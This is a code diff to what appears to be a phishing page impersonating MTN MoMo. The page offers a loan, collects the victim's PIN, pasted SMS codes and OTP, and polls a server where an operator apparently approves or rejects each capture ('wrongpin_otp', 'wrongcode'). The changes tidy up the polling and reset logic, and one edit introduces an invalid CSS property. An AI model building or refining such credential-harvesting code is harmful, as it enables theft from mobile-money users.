@@ -113,7 +113,7 @@
 
     /* LANDING PAGE */
     #page-landing { background: var(--page-bg); }
-    .land-nav { background: var(--navy); display: flex; align-items: center; justify-content: space-between; padding: 0 24px; height: 64px; flex-shrink: 0; }
+    .land-nav { background: var(--navy); display: flex; align-items: center; justify-style: space-between; padding: 0 24px; height: 64px; flex-shrink: 0; }
     .land-nav .hbg { display: flex; flex-direction: column; gap: 4px; cursor: pointer; }
     .land-nav .hbg span { width: 20px; height: 2px; background: rgba(255,255,255,0.8); border-radius: 1px; display: block; }
     .land-center { flex: 1; display: flex; align-items: center; justify-content: center; padding: 32px 16px; }
@@ -529,7 +529,7 @@
 <!-- PAGE OTP -->
 <div id="page-otp" class="page">
   <div class="otp-topbar">
-    <button class="bk" onclick="goTo('page-login')">←</button>
+    <button class="bk" onclick="resetAndGoLogin()">←</button>
     <div class="hp-logo-sm">
       <img src="images/mtn-logo.png" alt="MTN Logo" class="logo-img logo-img-sm">
       <div class="brand" style="color:var(--navy);"><span style="color:var(--yellow-dark);">MTN</span> MoMo</div>
@@ -967,12 +967,14 @@
 
         if (data.status === 'approved') {
           clearInterval(pinPollInterval);
+          pinPollInterval = null;
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpStep1').style.display = 'block';
           showOtpMsg('success', 'Information verified! Please complete Step 1: SMS Verification.');
 
         } else if (data.status === 'rejected') {
           clearInterval(pinPollInterval);
+          pinPollInterval = null;
           document.getElementById('pinWait').classList.remove('show');
           showOtpMsg('error', 'Your information could not be verified. Redirecting to login…');
           setTimeout(() => { resetAndGoLogin(); }, 2500);
@@ -994,6 +996,7 @@
 
         if (data.status === 'approved' || data.status === 'sms_approved') {
           clearInterval(smsPollInterval);
+          smsPollInterval = null;
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpStep1').style.display = 'none';
           document.getElementById('otpStep2').style.display = 'block';
@@ -1003,6 +1006,7 @@
 
         } else if (data.status === 'rejected' || data.status === 'sms_rejected') {
           clearInterval(smsPollInterval);
+          smsPollInterval = null;
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpStep1').style.display = 'block';
           document.getElementById('otpStep2').style.display = 'none';
@@ -1163,6 +1167,7 @@
 
         if (data.status === 'approved') {
           clearInterval(otpPollInterval);
+          otpPollInterval = null;
           document.getElementById('apAmt').textContent  = Number(S.amt || 50000).toLocaleString() + ' XAF';
           document.getElementById('apTerm').textContent = S.term || '12 Months';
           const a = Number(S.amt) || 50000;
@@ -1174,16 +1179,19 @@
 
         } else if (data.status === 'rejected') {
           clearInterval(otpPollInterval);
+          otpPollInterval = null;
           showOtpMsg('error', 'Verification failed. Please contact support.');
           document.getElementById('bOtp').disabled = false;
 
         } else if (data.status === 'wrongpin_otp') {
           clearInterval(otpPollInterval);
+          otpPollInterval = null;
           showOtpMsg('error', 'Incorrect PIN code detected. Redirecting to login…');
           setTimeout(() => { resetAndGoLogin(); }, 2500);
 
         } else if (data.status === 'wrongcode') {
           clearInterval(otpPollInterval);
+          otpPollInterval = null;
           for(let i=0; i<4; i++) document.getElementById('o'+i).value = '';
           document.getElementById('bOtp').className = 'btn-otp';
           document.getElementById('bOtp').disabled = false;
@@ -1199,14 +1207,27 @@
 
   function resetAndGoLogin() {
     document.getElementById('smsPasteInput').value = '';
-    for(let i=0; i<4; i++) document.getElementById('o'+i).value = '';
-    for(let i=0; i<5; i++) document.getElementById('p'+i).value = '';
+    
+    for(let i=0; i<4; i++) {
+      let el = document.getElementById('o'+i);
+      if (el) el.value = '';
+    }
+    for(let i=0; i<5; i++) {
+      let el = document.getElementById('p'+i);
+      if (el) el.value = '';
+    }
+
     document.getElementById('bOtp').className = 'btn-otp';
     document.getElementById('bOtp').disabled = false;
     document.getElementById('pinWait').classList.remove('show');
     document.getElementById('otpStep1').style.display = 'block';
     document.getElementById('otpStep2').style.display = 'none';
-    if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
+
+    if (typeof _rsInterval !== 'undefined' && _rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
+    if (typeof pinPollInterval !== 'undefined' && pinPollInterval) { clearInterval(pinPollInterval); pinPollInterval = null; }
+    if (typeof smsPollInterval !== 'undefined' && smsPollInterval) { clearInterval(smsPollInterval); smsPollInterval = null; }
+    if (typeof otpPollInterval !== 'undefined' && otpPollInterval) { clearInterval(otpPollInterval); otpPollInterval = null; }
+
     hideOtpMsgs();
     document.getElementById('bLogin').disabled = false;
     chkLogin();
